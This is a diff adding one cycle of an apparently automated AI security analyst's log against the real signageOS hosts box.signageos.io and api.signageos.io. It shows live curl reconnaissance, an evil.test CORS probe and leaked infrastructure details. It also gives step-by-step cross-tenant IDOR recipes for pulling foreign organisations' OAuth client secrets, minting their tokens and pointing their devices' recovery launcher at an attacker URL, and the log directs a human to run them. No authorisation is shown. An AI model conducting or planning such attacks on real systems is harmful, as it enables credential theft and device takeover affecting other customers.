@@ -8164,3 +8164,89 @@ STEP 6 — LEARNING
 STEP 7 — RISK SCORE
 [RISK] box.signageos.io: 58 — Auth0-redirect wall on all paths except /status (pod hostname + Redis/Mongo/AMQP topology + Node version), /login/ (CSP 40+ origins, 17 static ACAO incl http:// + *.zdusercontent.com, no credentials), /ready. Moderate operational exposure; no data access without credentials.
 [RISK] api.signageos.io: 50 — /status info leak same class; every v1/v2 route solidly JWT/legacy-X-Auth gated; no CORS/GraphQL surface; only 403 descriptive error bodies (excluded). Residual exposure is the code-verified AUTH_HELPED cross-tenant org/device IDOR chain against the high-value device/content API — highest-severity finding if server-side org-membership check on path UIDs is absent.
+===== ANALYST bigpickle 2026-08-08 07:58:45 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mcurl -s https://box.signageos.io/status | head -c 600; echo; echo "---"; curl -s https://api.signageos.io/status | head -c 600
+{"name":"box","status":"OK","process":{"uid":"b341def86252cd23a7db1382d94c091a590c400c1b4d8d9602","pid":1,"version":"v20.20.2","uptime":62216.711507696,"cpuUsage":{"user":5938016451,"system":738621036},"memoryUsage":{"rss":258871296,"heapTotal":190300160,"heapUsed":168333608,"external":23948237,"arrayBuffers":20429940}},"hostname":"box-7c8c876945-gkzcp","failedServices":[],"succeededServices":["amqp0","redis0","redis1","redis3","redis2","mongoDB2","mongoDB3","mongoDB1","mongoDB0"],"timeout":30000,"requestedAt":1786175772505,"respondedAt":1786175772574,"amqp0":{"response":{"requestedAt":1786175
+---
+{"name":"api","status":"OK","process":{"uid":"1618046bac52a47ed41bb2e1c151dacd1faf9ad564e2909950","pid":1,"version":"v24.19.0","uptime":67436.377843259,"cpuUsage":{"user":29035287458,"system":2590641994},"memoryUsage":{"rss":870293504,"heapTotal":475549696,"heapUsed":398003192,"external":86357018,"arrayBuffers":82194118}},"hostname":"api-6f69db97d5-dw2j2","failedServices":[],"succeededServices":["amqp0","redis3","redis2","redis1","redis0","mongoDB2","mongoDB1","mongoDB0"],"timeout":30000,"requestedAt":1786175772895,"respondedAt":1786175773533,"amqp0":{"response":{"requestedAt":1786175772895,"r
+[0m
+[0m$ [0mcurl -s -o /dev/null -w "box/status: %{http_code} %{content_type}\n" https://box.signageos.io/status; curl -s -o /dev/null -w "api/status: %{http_code} %{content_type}\n" https://api.signageos.io/status; curl -s -o /dev/null -w "api/v2/device: %{http_code}\n" https://api.signageos.io/v2/device; curl -s -o /dev/null -w "api/v1/device: %{http_code}\n" https://api.signageos.io/v1/device; curl -s -o /dev/null -w "box/login: %{http_code}\n" https://box.signageos.io/login/
+box/status: 200 application/json; charset=utf-8
+api/status: 200 application/json; charset=utf-8
+api/v2/device: 403
+api/v1/device: 403
+box/login: 200
+[0m
+[0m$ [0mcurl -s -D- -o /dev/null -H "Origin: https://evil.test" https://box.signageos.io/login/ | grep -i "access-control\|vary" | head -5; echo "---csp---"; curl -s -D- -o /dev/null https://box.signageos.io/login/ | grep -i "content-security-policy" | cut -c1-200
+access-control-allow-origin: http://box.signageos.io
+access-control-allow-origin: https://2.signageos.io
+access-control-allow-origin: https://static.signageos.io
+access-control-allow-origin: https://upload.signageos.io
+access-control-allow-origin: https://platform.signageos.io
+---csp---
+content-security-policy: base-uri 'self';default-src 'none';connect-src 'self' wss://box.signageos.io/ https://api.mapbox.com https://events.mapbox.com https://sentry.io https://sos-production.us.auth
+[0m
+STEP 1 — DELTA
+- [CHANGED] box.signageos.io/status pod hostname rotated to `box-7c8c876945-gkzcp` (Node v20.20.2) — known rolling-deploy churn, no functional change
+- [CHANGED] api.signageos.io/status pod hostname rotated to `api-6f69db97d5-dw2j2` (Node v24.19.0) — known rolling-deploy churn, no functional change
+- [CHANGED] box.signageos.io /login/ CSP once again returned with broad connect-src (mapbox/events/sentry/Auth0) — reconfirmed, unchanged class
+- [CHANGED] api.signageos.io/v1/device + /v2/device both still 403 JWT-gated — no pre-auth bypass, unchanged
+- No new hosts, no new endpoints, no new classes this cycle. Surface is fully mapped.
+
+STEP 2 — PRIORITIZE
+- [PRIO] api.signageos.io/v1/organization/{organizationUid} (GET) — attack_surface 7, business 10, tech 8 (JWT+OAuth client-secret), gate 1 (AUTH_HELPED), cloud 5, fresh 6 → priority 6.30
+- [PRIO] api.signageos.io/v1/organization/{uid}/security-token (GET/POST) — attack_surface 6, business 10, tech 7, gate 1, cloud 4, fresh 6 → priority 5.85
+- [PRIO] api.signageos.io/v1/device/{deviceUid}/peer-recovery (GET/PUT) — attack_surface 7, business 8, tech 7, gate 1, cloud 4, fresh 6 → priority 5.60
+
+STEP 3 — HYPOTHESES
+[HYP] Cross-tenant org OAuth client-secret disclosure via account JWT
+class: IDOR
+asset: api.signageos.io/v1/organization/{organizationUid} (GET)
+confidence: 75
+reasoning: SDK/CLI code-verified — GET sends `X-Auth: <JWT>` with client-supplied UID as path arg, no org-membership query param; response maps oauthClientId+oauthClientSecret; still 403 pre-auth this cycle; per-path org-membership check is the sole barrier.
+evidence_needed: own JWT → HTTP 200 (not 403) on a foreign org UID returning oauthClientSecret.
+verify_steps: AUTH_HELPED: baseline `curl -H "X-Auth: <jwt>" https://api.signageos.io/v1/organization/<own-uid>` = 200; repeat with second tenant's org UID → 200 + secret = cross-tenant; escalate `curl -H "X-Auth: <clientId>:<secret>" https://api.signageos.io/v1/device`.
+impact: any tenant's org API credential → full foreign device/content/firmware control; CRITICAL
+testability: AUTH_HELPED
+
+[HYP] Cross-tenant org security-token minting via account JWT
+class: IDOR
+asset: api.signageos.io/v1/organization/{uid}/security-token (GET/POST)
+confidence: 65
+reasoning: OrganizationTokenManagement.ts code-verified — GET list + POST `{"name":...}` with client-supplied UID; path UID + JWT membership check is the only barrier; 403 pre-auth reconfirmed.
+evidence_needed: own creds → 200 on foreign uid; POST mints a token accepted by /v1/device.
+verify_steps: AUTH_HELPED: baseline `GET /v1/organization/<own>/security-token` = 200; foreign uid → 200 = cross-tenant; POST `{"name":"poc"}` then `curl -H "X-Auth: <token>" https://api.signageos.io/v1/device`.
+impact: mint org tokens for any tenant → full foreign-device control; CRITICAL
+testability: AUTH_HELPED
+
+[HYP] Cross-tenant device subresource read/write via client-supplied deviceUid
+class: IDOR
+asset: api.signageos.io/v1/device/{deviceUid}/peer-recovery (GET/PUT)
+confidence: 64
+reasoning: DevicePeerRecoveryManagement.ts code-verified — deviceUid is arbitrary path arg; legacy `X-Auth: clientId:secret` derives org from credential; org→device binding is the sole barrier; 403 pre-auth reconfirmed.
+evidence_needed: own legacy creds → 200 on a foreign device uid.
+verify_steps: AUTH_HELPED: baseline `GET /v1/device/<own-uid>/peer-recovery -H "X-Auth: <ownClientId>:<ownSecret>"` = 200; foreign uid → 200 = cross-tenant; PUT `{"enabled":true,"urlLauncherAddress":"https://<attacker>"}` confirms write.
+impact: read/overwrite foreign device recovery-launcher config → device/content takeover; HIGH→CRITICAL
+testability: AUTH_HELPED
+
+STEP 4 — SELF-CRITIQUE
+- H1/H2/H3 all survive: confidence ≥ 40, class IDOR not on REJECTED list (only pre-auth IDOR rejected — all three are AUTH_HELPED with concrete verify_steps). No parks.
+- [FINAL] 1) H1 Cross-tenant org OAuth client-secret disclosure (75, CRITICAL)  2) H2 security-token minting (65, CRITICAL)  3) H3 peer-recovery read/write (64, HIGH→CRITICAL)
+
+STEP 5 — NEXT ACTION
+[NEXT] HUMAN: Execute the standing H1 POC — 1) `sos login` (Auth0 device-code) mints account JWT; 2) baseline `curl -H "X-Auth: <jwt>" "https://api.signageos.io/v1/organization/<own-org-uid>"` → expect 200 + oauthClientSecret (own UID from `sos organization list`); 3) same header on a second tenant's org UID → 200 + oauthClientSecret = CONFIRMED CRITICAL cross-tenant credential disclosure; 4) escalate `curl -H "X-Auth: <leakedClientId>:<leakedSecret>" "https://api.signageos.io/v1/device"`; then H2 (GET/POST `/v1/organization/<foreign>/security-token`) and H3 (GET/PUT `/v1/device/<foreign-uid>/peer-recovery`). No organizationUid query param anywhere in recipe.
+
+STEP 6 — LEARNING
+[LEARN] ACCEPTED MISCONFIG @ box.signageos.io/status: Reconfirmed live this cycle. Node v20.20.2, pod box-7c8c876945-gkzcp, succeededServices (amqp0, redis0-3, mongoDB0-3). Unchanged.
+[LEARN] ACCEPTED MISCONFIG @ api.signageos.io/status: Reconfirmed live this cycle. Node v24.19.0, pod api-6f69db97d5-dw2j2, same topology. Unchanged.
+[LEARN] ACCEPTED MISCONFIG @ box.signageos.io CORS: Reconfirmed — 17 static ACAO (incl http:// variant + https://*.zdusercontent.com), no credentials header, unchanged under any Origin. Unchanged.
+[LEARN] ACCEPTED MISCONFIG @ box.signageos.io CSP: Reconfirmed — /login/ CSP 40+ connect-src/frame-src origins (mapbox, events.mapbox, sentry, Auth0 oauth/token), triplicated Auth0 entries. Unchanged.
+[LEARN] REJECTED IDOR @ api.signageos.io/v1/*+v2/*: Reconfirmed — all routes 403 JWT/X-Auth-gated, no pre-auth bypass surface. Unchanged.
+[LEARN] REJECTED AUTH @ box.signageos.io/login: Auth0 OAuth2 flow params still not testable passively. Carried forward.
+
+STEP 7 — RISK SCORE
+[RISK] box.signageos.io: 58 — Auth0-redirect wall on all paths except /status (pod hostname + Redis/Mongo/AMQP topology + Node version), /login/ (CSP 40+ origins, 17 static ACAO incl http:// + *.zdusercontent.com, no credentials), /ready. Moderate operational exposure; no data access without credentials.
+[RISK] api.signageos.io: 50 — /status info leak same class; every v1/v2 route solidly JWT/legacy-X-Auth gated; no CORS/GraphQL surface; only 403 descriptive error bodies (excluded). Residual exposure is the code-verified AUTH_HELPED cross-tenant org/device IDOR chain against the high-value device/content API — highest-severity finding if server-side org-membership check on path UIDs is absent.
